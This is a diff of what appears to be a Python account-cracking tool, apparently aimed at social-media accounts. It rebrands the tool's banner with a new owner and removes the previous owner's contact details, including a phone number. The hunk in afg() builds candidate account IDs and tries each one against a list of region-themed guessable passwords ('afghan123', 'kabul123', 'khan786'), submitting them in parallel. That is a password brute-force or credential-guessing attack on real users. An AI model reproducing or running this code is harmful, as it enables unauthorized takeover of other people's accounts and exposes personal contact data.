@@ -9,7 +9,7 @@ try:
 	os.makedirs('/sdcard/IMTIAZ')
 except:
 		pass
-sys.stdout.write('\x1b]2;RANA-G\x07')
+sys.stdout.write('\x1b]2;IMTIAZ-G\x07')
 #<<_________[ LOGO ]_________>>#
 logo = (f"""
   {R}MMM.MMq.        db      `7MN.   `7MF'     db
@@ -20,9 +20,8 @@ logo = (f"""
   {R}MM   `Mb.   A'     VML    M     YMM   A'     VML
   {R}MML. .JMM..AMA.   .AMMA..JML.    YM .AMA.   .AMMA
 {W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
-{W} [{R}+{W}]{R} OWNER   {R}:{R} RANA NADEEM RAJPUT
-{W} [{R}+{W}]{W} FB ID   {R}:{W} ITXRANA.5214
-{W} [{R}+{W}]{W} WHATSAP {R}:{W} 03082503426
+{W} [{R}+{W}]{R} OWNER   {R}:{R} IMTIAZ AHMED
+{W} [{R}+{W}]{W} FB ID   {R}:{W} IMTIAZ AHMED
 {W} [{R}+{W}]{R} STATUS  {R}:{R} {status}
 {W} [{R}+{W}]{R} VERSION {R}:{R} {version}
 {W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
@@ -487,7 +486,7 @@ def afg():
                         line()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶Ã›Â·Ã›Â¸Ã›Â¹','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                 ranag1.submit(rd,ids,passlist)
                 print(f'\033[1;37m')
                 line()
